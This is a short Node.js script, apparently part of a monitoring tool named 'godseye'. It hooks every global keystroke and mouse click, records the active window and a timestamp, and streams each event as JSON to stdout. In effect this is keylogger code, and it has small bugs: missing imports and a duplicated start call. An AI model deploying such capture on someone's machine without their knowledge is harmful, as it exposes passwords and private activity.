// console.log("Child process created******")
const ioHook = require('iohook')
const activeWin = require('active-win')

try {
  ioHook.on('keydown', async (event) => {
    // console.log("The evenet registere is: ", event)
    await activeWin()
      .then((response) => {
        let time = new Date()
        let timeStampDetails = time.toDateString() + " " + time.toTimeString()
        finalObject = {keystrokeData: event,windowData: response,timeStamp: timeStampDetails}
        // process.send(finalObject)
        // console.log(finalObject)
        process.stdout.write(JSON.stringify(finalObject))
      })
      .catch((error) => {
        console.error("Error in keyborad active window event", error)
      })
  });
} catch(err) {
  let logsPath = path.join(os.homedir(), 'godseye')
}

try{
  ioHook.on('mousedown', async (event) => {
    // console.log("The evenet registere is: ", event)
    await activeWin()
      .then((response) => {
        let time = new Date()
        let timeStampDetails = time.toDateString() + " " + time.toTimeString()
        finalObject = {mouseData: event,windowData: response,timeStamp: timeStampDetails}
        // process.send(finalObject)
        // console.log(finalObject)
        process.stdout.write(JSON.stringify(finalObject))
      })
      .catch((error) => {
        console.error("Error in keyborad active window event", error)
      })
  });

  // Register and start hook
  ioHook.start()

  // Alternatively, pass true to start in DEBUG mode.
  ioHook.start(true)
} catch(err) {
  let logsPath = path.join(os.homedir(), 'godseye')
}



